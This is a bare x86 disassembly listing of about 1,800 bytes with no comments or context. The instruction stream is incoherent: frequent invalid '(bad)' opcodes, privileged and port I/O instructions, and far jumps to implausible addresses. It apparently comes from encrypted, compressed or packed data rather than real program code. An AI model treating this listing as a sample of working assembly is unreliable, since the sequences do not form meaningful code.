  408e77:	and    DWORD PTR [esi-0xb],edi
  408e7a:	loop   0x408e23
  408e7c:	mov    fs,WORD PTR [esp+eax*1]
  408e7f:	sbb    ch,BYTE PTR [edx]
  408e81:	lea    ecx,[eax+0x1c]
  408e84:	inc    esi
  408e85:	pop    eax
  408e86:	mov    ebx,0xbca88717
  408e8b:	add    BYTE PTR [edx+0x8],bl
  408e8e:	jno    0x408eb1
  408e90:	imul   ebx,DWORD PTR [eax+0x1],0x32c4a35f
  408e97:	sub    DWORD PTR [edx],ebx
  408e99:	shl    BYTE PTR [edx+eax*2+0x5cb5e61a],1
  408ea0:	jmp    0x92a65326
  408ea5:	pop    edx
  408ea6:	pop    edi
  408ea7:	sbb    al,0xb0
  408ea9:	add    ebx,DWORD PTR ds:0xd28701a0
  408eaf:	or     edi,edi
  408eb1:	adc    ebp,DWORD PTR [ecx+edi*1+0x72634e9a]
  408eb8:	xchg   ebp,eax
  408eb9:	push   ebp
  408eba:	sbb    DWORD PTR [eax-0x1737799b],esi
  408ec0:	(bad)  
  408ec1:	mov    esi,0x8169da31
  408ec6:	aam    0xdc
  408ec8:	sbb    eax,0xceb6392c
  408ecd:	jns    0x408ea1
  408ecf:	cmp    eax,0x54111683
  408ed4:	pop    eax
  408ed5:	cld    
  408ed6:	fst    DWORD PTR [edi]
  408ed8:	push   ecx
  408ed9:	sub    DWORD PTR [edx],edx
  408edb:	fs mov bl,0xac
  408ede:	inc    esp
  408edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ee0:	enter  0xf5e0,0x5f
  408ee4:	nop
  408ee5:	arpl   ax,di
  408ee7:	test   DWORD PTR [ecx],0x980dc963
  408eed:	xchg   DWORD PTR [ebx+eiz*1+0x15],esi
  408ef1:	test   BYTE PTR [ecx+0x2eea0943],0xdc
  408ef8:	inc    ebp
  408ef9:	cmp    BYTE PTR [esi-0x15160e83],dl
  408eff:	fsub   st,st(5)
  408f01:	rcr    BYTE PTR [ecx+0xf72a208],cl
  408f07:	(bad)  
  408f08:	hlt    
  408f09:	mov    eax,0x6d0101b0
  408f0e:	ja     0x408f56
  408f10:	sti    
  408f11:	call   0xaf64:0x9c262cdf
  408f18:	xor    DWORD PTR [ecx],ecx
  408f1a:	mov    cl,0x2c
  408f1c:	sub    al,0x25
  408f1e:	call   0xf329b67a
  408f23:	(bad)  
  408f24:	mov    eax,ds:0x8274adaa
  408f29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f2a:	dec    esp
  408f2b:	and    ebp,DWORD PTR [ebp+0x32]
  408f2e:	push   ebp
  408f2f:	addr16 mov ds:0x8cb8,eax
  408f33:	(bad)  
  408f34:	push   0xab7d9cfe
  408f39:	inc    eax
  408f3a:	dec    edx
  408f3b:	call   0xcf09:0xb33d1650
  408f42:	or     ebp,esp
  408f44:	pop    eax
  408f45:	cdq    
  408f46:	mov    ah,0x68
  408f48:	test   al,ah
  408f4a:	leave  
  408f4b:	rcr    DWORD PTR [edx],0xa1
  408f4e:	stos   DWORD PTR es:[edi],eax
  408f4f:	adc    DWORD PTR [ebx+0x59a084a8],edi
  408f55:	inc    esi
  408f56:	jb     0x408f16
  408f58:	je     0x408ee9
  408f5a:	jns    0x408f4d
  408f5c:	out    dx,al
  408f5d:	xor    DWORD PTR [ebx+0x3637b346],edi
  408f63:	loope  0x408fd8
  408f65:	xchg   esi,eax
  408f66:	pop    esp
  408f67:	pop    ebp
  408f68:	mov    esi,0x68baa588
  408f6d:	mov    ecx,0xd76f7d06
  408f72:	loopne 0x408f6b
  408f74:	sbb    ebx,ebp
  408f76:	ror    BYTE PTR [edx],0xe0
  408f79:	imul   eax,eax,0x7
  408f7c:	xor    bl,BYTE PTR [ebx-0x17]
  408f7f:	jne    0x408f66
  408f81:	mov    al,dl
  408f83:	mov    eax,0x8afa884e
  408f88:	sbb    BYTE PTR [edi],bl
  408f8a:	fs dec esp
  408f8c:	std    
  408f8d:	mov    eax,ds:0x4fbf37d2
  408f92:	mov    ebx,0xa635cdd3
  408f97:	jnp    0x408ff8
  408f99:	sar    DWORD PTR [esi+ecx*4+0x502fdb0],1
  408fa0:	pop    ebp
  408fa1:	popf   
  408fa2:	scas   al,BYTE PTR es:[edi]
  408fa3:	std    
  408fa4:	jle    0x408f94
  408fa6:	jno    0x408f3c
  408fa8:	shl    DWORD PTR [esi+0x1a],cl
  408fab:	xchg   ebp,eax
  408fac:	mov    al,ds:0x8abf429d
  408fb1:	rcl    ebx,cl
  408fb3:	(bad)  
  408fb4:	cld    
  408fb5:	mov    dh,0x12
  408fb7:	jmp    0x620:0xd76c10c1
  408fbe:	retf   
  408fbf:	sbb    ebp,DWORD PTR [eax-0x397d9e2e]
  408fc5:	and    cl,BYTE PTR [edx+ebx*8-0x3a02cf18]
  408fcc:	or     eax,0xacf94fea
  408fd1:	pop    ss
  408fd2:	das    
  408fd3:	aam    0x2e
  408fd5:	mov    al,0x74
  408fd7:	(bad)  
  408fd9:	stc    
  408fda:	out    0x1b,al
  408fdc:	rcr    DWORD PTR [edi],1
  408fde:	and    eax,0xadf0eea7
  408fe3:	jmp    0x50ca0ce5
  408fe8:	test   eax,0xf7815599
  408fed:	rol    dh,cl
  408fef:	pop    ebx
  408ff0:	addr16 jno 0x409038
  408ff3:	sahf   
  408ff4:	retf   
  408ff5:	jne    0x40903d
  408ff7:	xor    eax,0x10fd33c1
  408ffc:	(bad)  
  408ffd:	out    dx,al
  408ffe:	lods   al,BYTE PTR ds:[esi]
  408fff:	aam    0xea
  409001:	adc    al,0x8b
  409003:	out    dx,al
  409004:	mov    al,0x17
  409006:	out    dx,al
  409007:	sbb    BYTE PTR [ebp-0x2f],0xc8
  40900b:	pushf  
  40900c:	(bad)  
  40900d:	dec    esi
  40900e:	xchg   ecx,eax
  40900f:	addr16 repnz popf 
  409012:	test   al,0xb1
  409014:	fs inc edx
  409016:	xchg   esp,eax
  409017:	sub    ecx,DWORD PTR [edx-0x10d90d4a]
  40901d:	cmp    al,0x2d
  40901f:	xor    eax,0xbf568683
  409024:	cmp    esp,DWORD PTR [ecx+0x62a98f7]
  40902a:	sub    al,0x22
  40902c:	je     0x40900e
  40902e:	dec    dl
  409030:	jae    0x408fbd
  409032:	or     al,0x6f
  409034:	xchg   ecx,eax
  409035:	ds push ebx
  409037:	sub    DWORD PTR [ebp-0x4b07f65],ebx
  40903d:	xor    al,0x88
  40903f:	cmp    al,0xae
  409041:	ss push 0x59
  409044:	jg     0x409067
  409046:	(bad)  
  409047:	(bad)  
  409048:	push   eax
  409049:	mov    eax,0x2a12c7fa
  40904e:	pop    ecx
  40904f:	scas   al,BYTE PTR es:[edi]
  409050:	sub    DWORD PTR [esi],eax
  409052:	dec    edx
  409053:	lock stc 
  409055:	mov    dl,0x9c
  409057:	fstp   QWORD PTR [ebx+0x50]
  40905a:	leave  
  40905b:	out    0x8f,eax
  40905d:	mov    WORD PTR [ecx-0x62],es
  409060:	xor    eax,0xbd9c243a
  409065:	retf   0xfa94
  409068:	in     eax,dx
  409069:	jns    0x408fed
  40906b:	mov    ecx,edx
  40906d:	sbb    DWORD PTR [ebx],ebx
  40906f:	arpl   WORD PTR ds:0x540f2a17,sp
  409075:	mov    bh,0x8d
  409077:	sar    BYTE PTR [eax+0x41],1
  40907a:	repz cmp DWORD PTR [ecx-0x4ed8714e],esp
  409081:	jmp    0x96b57eac
  409086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409087:	loope  0x40908b
  409089:	out    dx,al
  40908a:	adc    DWORD PTR ds:0x5381ed37,ebx
  409090:	jmp    0xfc90:0x11e29053
  409097:	lock outs dx,DWORD PTR ds:[esi]
  409099:	shl    DWORD PTR [ecx],0xcd
  40909c:	mov    cl,0xd3
  40909e:	leave  
  40909f:	push   eax
  4090a0:	jno    0x409058
  4090a2:	push   es
  4090a3:	dec    ebx
  4090a4:	jnp    0x4090b2
  4090a6:	in     eax,0x2c
  4090a8:	lock mov cl,0xa8
  4090ab:	sahf   
  4090ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090ad:	and    bl,BYTE PTR [esi+0x19]
  4090b0:	sbb    BYTE PTR [esi-0x2b],bh
  4090b3:	and    esp,DWORD PTR [eax-0x57]
  4090b6:	arpl   WORD PTR [esp+edx*2+0x606aefd9],ax
  4090bd:	repz clc 
  4090bf:	mov    cs,WORD PTR [edi+0x6b823b94]
  4090c5:	in     eax,0x9a
  4090c7:	mov    ebx,ds
  4090c9:	cmp    DWORD PTR [ecx-0x1193614f],esi
  4090cf:	dec    ebp
  4090d0:	sub    DWORD PTR [ebx],esp
  4090d2:	inc    eax
  4090d3:	jae    0x409153
  4090d5:	xchg   edx,eax
  4090d6:	cmc    
  4090d7:	or     dh,bl
  4090d9:	mov    edi,0x4b2a87ef
  4090de:	mov    ds:0x56c7a439,al
  4090e3:	les    ebx,FWORD PTR [esi+0x115cac87]
  4090e9:	jp     0x409153
  4090eb:	iret   
  4090ec:	das    
  4090ed:	xor    BYTE PTR [edi+0x4cc04fd2],dl
  4090f3:	inc    ebx
  4090f4:	push   esp
  4090f5:	stos   DWORD PTR es:[edi],eax
  4090f6:	test   eax,0xba27b3a4
  4090fb:	xchg   ebx,eax
  4090fc:	add    ebx,DWORD PTR [ecx-0x38]
  4090ff:	cmp    ah,BYTE PTR es:[ecx+0x63ce5b7a]
  409106:	call   0x8644b820
  40910b:	aam    0xbd
  40910d:	das    
  40910e:	sbb    al,0x13
  409110:	aad    0xb7
  409112:	(bad)  
  409114:	or     bl,BYTE PTR [ebx]
  409116:	jnp    0x4090aa
  409118:	mov    edx,0xcbc0dc73
  40911d:	mov    ds:0x9ac076c3,al
  409122:	inc    edi
  409123:	rol    BYTE PTR [edi],cl
  409125:	mov    ebx,0xbd731b4c
  40912a:	fcmovu st,st(0)
  40912c:	or     eax,ebp
  40912e:	ds pop ss
  409130:	push   0x63
  409132:	push   ss
  409133:	fsub   QWORD PTR [edi+0x7af63989]
  409139:	test   al,0xa5
  40913b:	aaa    
  40913c:	cmp    BYTE PTR [eax],ch
  40913e:	pop    edi
  40913f:	jae    0x409120
  409141:	enter  0x9f82,0xbc
  409145:	iret   
  409146:	xchg   ebp,eax
  409147:	add    al,0xb7
  409149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40914a:	add    ebx,DWORD PTR gs:[ebx]
  40914d:	scas   al,BYTE PTR es:[edi]
  40914e:	loopne 0x40912c
  409150:	lods   eax,DWORD PTR ds:[esi]
  409151:	loope  0x409152
  409153:	sti    
  409154:	mov    edx,0x633e5df2
  409159:	mov    ebp,0x20278e16
  40915e:	adc    al,0x53
  409160:	push   0x4259e11e
  409165:	dec    esi
  409166:	or     dh,BYTE PTR [edx+0x2e6af241]
  40916c:	in     al,0x7a
  40916e:	ss sbb eax,0x6352a9b8
  409174:	jg     0x4090f8
  409176:	mov    ecx,0xf1d1e813
  40917b:	mov    ds:0xaa539043,al
  409180:	test   esp,ebp
  409182:	outs   dx,BYTE PTR ds:[esi]
  409183:	cld    
  409184:	pushf  
  409185:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409186:	imul   al
  409188:	inc    eax
  409189:	loope  0x40918a
  40918b:	jo     0x40919a
  40918d:	lock adc dl,bl
  409190:	jbe    0x40911f
  409192:	cmp    bh,cl
  409194:	sub    al,0xc8
  409196:	shl    ebp,cl
  409198:	and    edx,DWORD PTR [ebp-0x2a]
  40919b:	mov    ?,WORD PTR [ebp+0x4a]
  40919e:	out    0xdd,eax
  4091a0:	les    eax,FWORD PTR [edi]
  4091a2:	pop    ds
  4091a3:	add    dh,dh
  4091a5:	inc    ebp
  4091a6:	int    0x9c
  4091a8:	add    ch,ch
  4091aa:	mov    BYTE PTR [esi+edx*1],dl
  4091ad:	nop
  4091ae:	pand   mm2,QWORD PTR [edi]
  4091b1:	sar    cl,cl
  4091b3:	inc    DWORD PTR [edx-0x3f]
  4091b6:	mov    bh,0x3c
  4091b8:	xor    al,0xcc
  4091bb:	pop    edx
  4091bc:	cmc    
  4091bd:	mov    ch,0xbe
  4091bf:	addr16 pop edx
  4091c1:	int3   
  4091c2:	nop
  4091c3:	mov    ecx,0x5b5e4128
  4091c8:	in     al,dx
  4091c9:	lahf   
  4091ca:	ds int 0x8e
  4091cd:	cmp    BYTE PTR ds:0x1550c6fa,ch
  4091d3:	popa   
  4091d4:	bound  edi,QWORD PTR [eax+eiz*2-0x2db42ec7]
  4091db:	(bad)  
  4091dc:	or     al,0x59
  4091de:	cmc    
  4091df:	sar    DWORD PTR ds:0x8d49eb27,1
  4091e5:	and    esi,DWORD PTR [edi+0x489e7004]
  4091eb:	arpl   WORD PTR [edx+0x6f],cx
  4091ee:	mov    esi,0xa29dd6dd
  4091f3:	(bad)  
  4091f4:	mov    edx,0xd62684ee
  4091f9:	push   esp
  4091fa:	mov    edx,0x702a3d4
  4091ff:	scas   eax,DWORD PTR es:[edi]
  409200:	es hlt 
  409202:	push   ebx
  409203:	jp     0x409203
  409205:	aam    0x42
  409207:	sti    
  409208:	push   edi
  409209:	adc    al,0x64
  40920b:	mov    WORD PTR [edi+0x65],ss
  40920e:	shl    BYTE PTR ds:0x54e5e6be,cl
  409214:	cli    
  409215:	and    cl,dh
  409217:	push   esp
  409218:	bound  edi,QWORD PTR [edi]
  40921a:	push   eax
  40921b:	out    0x1a,al
  40921d:	and    BYTE PTR [esi+0x34f4a7bf],bl
  409223:	(bad)  
  409224:	mov    al,0x7d
  409226:	push   edx
  409227:	ror    DWORD PTR [esi],0x69
  40922a:	mov    al,ds:0xe4839f69
  40922f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409230:	push   edi
  409231:	push   ebx
  409232:	mov    ch,0x68
  409234:	js     0x4091cb
  409236:	gs fcmovnb st,st(5)
  409239:	jl     0x409261
  40923b:	ds jne 0x4091fe
  40923e:	fs add al,0x22
  409241:	(bad)  
  409242:	aam    0x65
  409244:	test   eax,0x7ddde6c7
  409249:	stos   DWORD PTR es:[edi],eax
  40924a:	mov    esp,DWORD PTR [ecx]
  40924c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40924d:	jae    0x40927c
  40924f:	out    0xf0,eax
  409251:	repz mov bl,0x39
  409254:	mov    ds:0x521f9a82,al
  409259:	mov    cl,0x26
  40925b:	adc    ebx,DWORD PTR [eax-0x2b746c2d]
  409261:	dec    edx
  409262:	fidivr DWORD PTR [edi]
  409264:	cwde   
  409265:	xchg   BYTE PTR [esi+0x5f9bd823],ch
  40926b:	and    edx,DWORD PTR [ecx-0x1f]
  40926e:	sahf   
  40926f:	xor    DWORD PTR [ebx-0x23049d4d],edi
  409275:	or     ebx,DWORD PTR [ebp-0x239334d0]
  40927b:	hlt    
  40927c:	rol    BYTE PTR [ebx],0x6e
  40927f:	adc    DWORD PTR [edx-0x3e442d],ebx
  409285:	cmp    DWORD PTR [ebp+0x76],ecx
  409288:	fs push ebp
  40928a:	aad    0x49
  40928c:	int    0xc0
  40928e:	icebp  
  40928f:	inc    esp
  409290:	mov    edi,0x6e254110
  409295:	adc    BYTE PTR [ecx+0x56],ah
  409298:	mov    bl,0x94
  40929a:	std    
  40929b:	fwait
  40929c:	test   DWORD PTR [ebx],edx
  40929e:	mov    ds:0xf9e4d61d,eax
  4092a3:	inc    edi
  4092a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092a5:	lods   al,BYTE PTR ds:[esi]
  4092a6:	dec    ebx
  4092a7:	jmp    0x4092be
  4092a9:	and    ecx,DWORD PTR [edx]
  4092ab:	dec    edi
  4092ac:	dec    ebp
  4092ad:	sbb    esi,DWORD PTR [eax+ecx*4+0x49]
  4092b1:	shl    DWORD PTR [eax],1
  4092b3:	clc    
  4092b4:	or     ch,ch
  4092b6:	gs in  eax,dx
  4092b8:	mov    ah,0x39
  4092ba:	into   
  4092bb:	outs   dx,DWORD PTR ds:[esi]
  4092bc:	push   cs
  4092bd:	adc    esi,DWORD PTR [eax]
  4092bf:	xchg   esp,eax
  4092c0:	mov    ch,0xbf
  4092c2:	ins    DWORD PTR es:[edi],dx
  4092c3:	(bad)  
  4092c4:	sub    eax,0x20ba2e33
  4092c9:	mul    DWORD PTR [eax+0x5c]
  4092cc:	fst    DWORD PTR [esi]
  4092ce:	jg     0x409326
  4092d0:	shl    eax,0x1c
  4092d3:	jmp    0x409314
  4092d5:	and    BYTE PTR [esi+0x41],ah
  4092d8:	jo     0x40927f
  4092da:	out    dx,al
  4092db:	rcr    BYTE PTR [edi+esi*1-0xb],0xff
  4092e0:	gs nop
  4092e2:	sub    DWORD PTR [esi+0x30b225b6],ebp
  4092e8:	int3   
  4092e9:	add    al,0x19
  4092eb:	sahf   
  4092ec:	xchg   esi,eax
  4092ed:	push   eax
  4092ee:	(bad)  
  4092ef:	in     eax,dx
  4092f0:	or     BYTE PTR [eax+edi*2+0x138fbf7f],ah
  4092f7:	add    al,0x79
  4092f9:	aas    
  4092fa:	dec    ecx
  4092fb:	lahf   
  4092fc:	push   edi
  4092fd:	jle    0x409374
  4092ff:	sub    eax,0xbbd02095
  409304:	ins    DWORD PTR es:[edi],dx
  409305:	or     DWORD PTR [ebx],edx
  409307:	leave  
  409308:	mov    cl,bh
  40930a:	or     eax,0x417bc935
  40930f:	nop
  409310:	dec    edx
  409311:	mov    al,BYTE PTR [edi]
  409313:	sbb    edx,DWORD PTR [edi]
  409315:	sub    eax,0x6aa687ab
  40931a:	(bad)  [ebp-0x9bf75cd]
  409320:	pop    esp
  409321:	and    DWORD PTR [edi],ecx
  409323:	stc    
  409324:	cwde   
  409325:	in     eax,0xf5
  409327:	mov    eax,esp
  409329:	xchg   esi,eax
  40932a:	pop    ebp
  40932b:	dec    ebp
  40932c:	inc    esi
  40932d:	int3   
  40932e:	pop    ss
  40932f:	ja     0x4092e6
  409331:	out    0xfb,eax
  409333:	(bad)  
  409334:	adc    eax,ebx
  409336:	pop    ebx
  409337:	push   ecx
  409338:	stos   BYTE PTR es:[edi],al
  409339:	(bad)
  40933c:	sub    ch,al
  40933e:	retf   0xb58e
  409341:	je     0x40931d
  409343:	lock mov ds:0x9bbef8df,al
  409349:	push   ds
  40934a:	push   ebp
  40934b:	fcmovne st,st(6)
  40934d:	stos   BYTE PTR es:[edi],al
  40934e:	es ja  0x4093bc
  409351:	scas   al,BYTE PTR es:[edi]
  409352:	dec    ecx
  409353:	stos   DWORD PTR es:[edi],eax
  409354:	jbe    0x409340
  409356:	add    DWORD PTR ds:0xb553781,edi
  40935c:	mov    edi,0xa8782557
  409361:	sbb    BYTE PTR [edi+0x7dfe87ec],dh
  409367:	retf   0x5a72
  40936a:	mov    esp,0x700ac0c5
  40936f:	jp     0x4093ec
  409371:	aaa    
  409372:	sbb    esp,0xffffffc2
  409375:	retf   0x9e43
  409378:	fcom   QWORD PTR [edx]
  40937a:	xor    BYTE PTR [ebx-0x6de076af],dl
  409380:	jae    0x409370
  409382:	mov    eax,ds:0x6db74ac8
  409387:	pop    ebp
  409388:	pop    ds
  409389:	push   eax
  40938a:	or     eax,0x343db9f
  40938f:	out    0x5c,eax
  409391:	stos   DWORD PTR es:[edi],eax
  409392:	call   0xc6b1d03e
  409397:	js     0x4093ab
  409399:	test   BYTE PTR [ebx+0x0],0xb3
  40939d:	jb     0x40939d
  40939f:	sbb    al,0xd7
  4093a1:	rol    BYTE PTR [esi+0x56cdc8eb],cl
  4093a7:	rcr    edi,1
  4093a9:	ret    
  4093aa:	or     al,0xc2
  4093ac:	mov    fs,WORD PTR [ebx-0x3f]
  4093af:	mov    esi,0xadd2350f
  4093b4:	push   ebp
  4093b5:	cmp    DWORD PTR ds:0x89be174b,esi
  4093bb:	dec    esi
  4093bc:	sbb    ecx,0xffffff84
  4093bf:	pop    ecx
  4093c0:	push   ecx
  4093c1:	sub    eax,0x4d43a753
  4093c6:	xchg   edi,esp
  4093c8:	cmp    DWORD PTR [ecx+eax*4-0x2522fc1c],ebp
  4093cf:	popf   
  4093d0:	inc    eax
  4093d1:	test   al,0x88
  4093d3:	popf   
  4093d4:	je     0x4093ee
  4093d6:	fld    DWORD PTR [edi-0x36]
  4093d9:	fdivr  QWORD PTR [edi-0x63]
  4093dc:	mov    ds:0x2d2141e3,al
  4093e1:	dec    ebx
  4093e2:	aas    
  4093e3:	mov    edx,0xec9c1ee7
  4093e8:	add    edi,DWORD PTR [edx]
  4093ea:	xchg   esp,eax
  4093eb:	clc    
  4093ec:	scas   eax,DWORD PTR es:[edi]
  4093ed:	popf   
  4093ee:	mov    ds:0xecdab020,eax
  4093f3:	push   ebp
  4093f4:	imul   ecx,DWORD PTR [edi+ebx*8-0x2b7dc4df],0x1213623f
  4093ff:	and    BYTE PTR [ebx-0x2],ch
  409402:	sub    al,0x32
  409404:	jbe    0x4093b7
  409406:	cli    
  409407:	push   eax
  409408:	scas   eax,DWORD PTR es:[edi]
  409409:	iret   
  40940a:	popf   
  40940b:	mov    ebp,0x42ff537c
  409410:	lods   al,BYTE PTR ds:[esi]
  409411:	jb     0x40946a
  409413:	aas    
  409414:	dec    ebx
  409415:	jmp    FWORD PTR [edx-0x7386e0f6]
  40941b:	adc    DWORD PTR [ecx],ecx
  40941d:	pusha  
  40941e:	mov    ebx,0xa70c8658
  409423:	leave  
  409424:	jno    0x4094a3
  409426:	(bad)  [eax-0x1a332d08]
  40942c:	and    eax,0xb01fef1f
  409431:	xchg   edx,eax
  409432:	sbb    al,0x25
  409434:	and    cl,BYTE PTR [edi]
  409436:	pop    ebp
  409437:	shl    BYTE PTR [eax+0x14],0x31
  40943b:	out    0x1a,al
  40943d:	fnstenv ds:0x313045fa
  409443:	inc    ebx
  409444:	cmp    bl,BYTE PTR [ebx*4+0x54bf9762]
  40944b:	fisubr DWORD PTR [edi+ebp*1-0x2bd4e104]
  409452:	xchg   ecx,eax
  409453:	outs   dx,BYTE PTR ds:[esi]
  409454:	repnz sub BYTE PTR [ebx],ah
  409457:	mov    al,ds:0xa2c73fa1
  40945c:	or     BYTE PTR [ecx-0x3a],0xb5
  409460:	inc    esi
  409461:	mov    bh,0x31
  409463:	fmul   st,st(4)
  409465:	mov    cl,0xe8
  409467:	pop    ss
  409468:	scas   eax,DWORD PTR es:[edi]
  409469:	and    edx,DWORD PTR [esi+0x4294da7a]
  40946f:	(bad)  
  409470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409471:	in     al,dx
  409472:	adc    eax,ebp
  409474:	cmp    dh,bh
  409476:	cmp    BYTE PTR [ebp-0x13],al
  409479:	push   ebp
  40947a:	jmp    0x97a10474
  40947f:	and    al,0x6f
  409481:	adc    DWORD PTR [esi-0x6316c918],0xeac9329
  40948b:	repz add al,0x87
  40948e:	xchg   al,ch
  409490:	inc    ecx
  409491:	xor    eax,0xb9c66a9a
  409496:	mov    ebp,0xe49fb9b5
  40949b:	ret    
  40949c:	retf   0xbc01
  40949f:	sub    al,0xb
  4094a1:	add    DWORD PTR [edi+0x772e93cf],ecx
  4094a7:	mov    ah,ah
  4094a9:	frstor [ecx]
  4094ab:	jno    0x409520
  4094ad:	push   esi
  4094ae:	cmc    
  4094af:	inc    esp
  4094b0:	cs loopne 0x409471
  4094b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094b4:	pushf  
  4094b5:	sbb    al,dh
  4094b7:	cmp    edi,DWORD PTR [esi-0x145c48d5]
  4094bd:	xlat   BYTE PTR ds:[ebx]
  4094be:	jmp    0x861d:0xc468f378
  4094c5:	jmp    0x59d8:0x921dee59
  4094cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094cd:	das    
  4094ce:	and    DWORD PTR [esi],0x6f6fabb4
  4094d4:	mov    esi,0x5c45c389
  4094d9:	dec    edi
  4094da:	sub    eax,0xfc693970
  4094df:	or     bl,BYTE PTR [ebx-0x6804acf8]
  4094e5:	dec    edi
  4094e6:	push   ss
  4094e7:	nop
  4094e8:	mov    ds:0x3a800d6d,eax
  4094ed:	icebp  
  4094ee:	repnz scas eax,DWORD PTR es:[edi]
  4094f0:	int3   
  4094f1:	popa   
  4094f2:	call   0xd989:0x1aea7b7f
  4094f9:	dec    al
  4094fb:	push   ds
  4094fc:	dec    ecx
  4094fd:	retf   
  4094fe:	ins    BYTE PTR es:[edi],dx
  4094ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409500:	push   ebp
  409502:	scas   eax,DWORD PTR es:[edi]
  409503:	pusha  
  409504:	pop    edi
  409505:	or     cl,al
  409507:	bound  ecx,QWORD PTR [edx+eiz*1]
  40950a:	mov    BYTE PTR [edx+eax*2-0x6b],bh
  40950e:	jmp    0x51b5:0xf3b481f3
  409515:	xor    eax,edx
  409517:	cmp    ecx,DWORD PTR [eax]
  409519:	gs pop ds
  40951b:	or     DWORD PTR [ecx+0x2b8b6e81],0x61ba491a
  409525:	push   0x4fe336a1
  40952a:	mov    ah,0x1a
  40952c:	nop
  40952d:	scas   al,BYTE PTR es:[edi]
  40952e:	adc    DWORD PTR [ecx+ebx*4-0x37],0x1c98cfda
  409536:	or     eax,0xec39b935
  40953b:	sub    al,0x4b
  40953d:	fild   DWORD PTR [esi]
  40953f:	mov    dh,0x5f
  409541:	jae    0x4094db
  409543:	xlat   BYTE PTR ds:[ebx]
  409544:	je     0x409581
  409546:	lock xor al,0x5
  409549:	stos   BYTE PTR es:[edi],al
  40954a:	in     al,0x81
  40954c:	add    al,BYTE PTR [ebp+0x15]
  40954f:	retf   
  409550:	or     DWORD PTR [ebx+0x29772217],ebx
  409556:	push   es
  409557:	mov    ?,WORD PTR [ebx+0x1c]
  40955a:	sub    al,0x60
  40955c:	cmp    ecx,esi
  40955e:	sbb    eax,0xd020a0bd
  409563:	xor    DWORD PTR [ecx-0xbe4c4cf],0x638e7324
  40956d:	iret   
  40956e:	mov    eax,0xa06bffd8
  409573:	fstp   QWORD PTR [eax]
  409575:	test   al,0x8b
  409577:	xor    cl,bh
  409579:	jmp    0xc418:0x7fbf9f9a
  409580:	cs hlt 
  409582:	jp     0x4095ab
  409584:	daa    
  409585:	mov    eax,ds:0x82c7c614
  40958a:	add    ebp,ebx
  40958c:	stos   BYTE PTR es:[edi],al
  40958d:	repnz adc cl,BYTE PTR [edx]
  409590:	pop    eax
  409591:	xchg   edi,eax
  409592:	lahf   
  409593:	jbe    0x409534
  409595:	dec    ecx
  409596:	sbb    DWORD PTR [edi+0x0],esi
  409599:	arpl   WORD PTR [edi-0xacd1a78],cx
  40959f:	mov    ah,0x2a
  4095a1:	jbe    0x4095d7
  4095a3:	call   0x4406c04f
  4095a8:	(bad)  [eax-0x4a]
  4095ab:	imul   esi,DWORD PTR [edx-0x66],0x728a29c9
  4095b2:	jnp    0x4095df
  4095b4:	lock shr cl,cl
  4095b7:	adc    edi,DWORD PTR [esi-0xd2ea9b5]
  4095bd:	mov    ah,0x28
  4095bf:	repnz pop edx
  4095c1:	stos   DWORD PTR es:[edi],eax
  4095c2:	adc    BYTE PTR [ebx],ah
  4095c4:	xchg   ebp,eax
  4095c5:	cwde   
  4095c6:	add    al,0x71
  4095c8:	out    0x53,al
  4095ca:	pop    ss
  4095cb:	pop    ecx
  4095cc:	pop    ds
  4095cd:	lods   eax,DWORD PTR ds:[esi]
  4095ce:	lahf   
  4095cf:	mov    ds:0x3278d956,eax
  4095d4:	rol    edi,cl
  4095d6:	cdq    
  4095d7:	imul   ebx,DWORD PTR [edi-0x7f],0x78
  4095db:	sbb    DWORD PTR [edi-0x7d56d667],ecx
  4095e1:	sti    
  4095e2:	rcr    BYTE PTR [ebx],1
  4095e4:	rsm    
  4095e6:	dec    esp
  4095e7:	mov    bh,0x71
  4095e9:	jp     0x4095e5
  4095eb:	data16 test al,0x69
  4095ee:	mov    edi,0xa27b94e4
  4095f3:	(bad)  
  4095f4:	cmp    eax,0x7010b806
  4095f9:	out    0x68,al
  4095fb:	cmp    DWORD PTR [edx+0x109959b],eax
  409601:	jno    0x40959f
  409603:	mov    dl,0xb3
  409605:	out    dx,eax
  409606:	not    DWORD PTR [ebp-0x7c]
  409609:	sbb    BYTE PTR [ebp-0x59233076],dh
  40960f:	add    al,0x1
  409611:	xchg   BYTE PTR [esi-0x5a],dh
  409614:	xchg   esp,eax
  409615:	and    BYTE PTR [edx+0x45],0xe3
  409619:	sub    edi,DWORD PTR [ebx-0x48f6880d]
  40961f:	inc    ecx
  409620:	xor    eax,0xeb5e7160
  409625:	xchg   edx,eax
  409626:	inc    ecx
  409627:	cmp    BYTE PTR [ebx],dl
  409629:	pop    ecx
  40962a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40962b:	jl     0x4095b5
  40962d:	jnp    0x4095b4
  40962f:	fwait
  409630:	inc    esi
  409631:	gs pop si
  409634:	mov    ch,0x52
  409636:	rol    BYTE PTR [eax],0x66
  409639:	add    BYTE PTR [esi+0x53],cl
  40963c:	es cld 
  40963e:	adc    DWORD PTR ds:0x4ee6c7a7,esp
  409644:	cmp    ecx,ebx
  409646:	xor    eax,0xfb950cd6
  40964b:	std    
  40964c:	jno    0x409638
  40964e:	mov    edi,0xe012e4dc
  409653:	and    al,0x11
  409655:	(bad)  
  409656:	in     al,dx
  409657:	loopne 0x409611
  409659:	mov    ebp,0xce83fd8c
  40965e:	adc    eax,0x84e34730
  409663:	jge    0x4096c3
  409665:	mov    ds:0xfef2ab7b,eax
  40966a:	idiv   DWORD PTR [edx]
  40966c:	or     ch,BYTE PTR [esi+0x21]
  40966f:	scas   al,BYTE PTR es:[edi]
  409670:	call   0xb8613f75
  409675:	and    BYTE PTR [edi+0xfb5caf1],ch
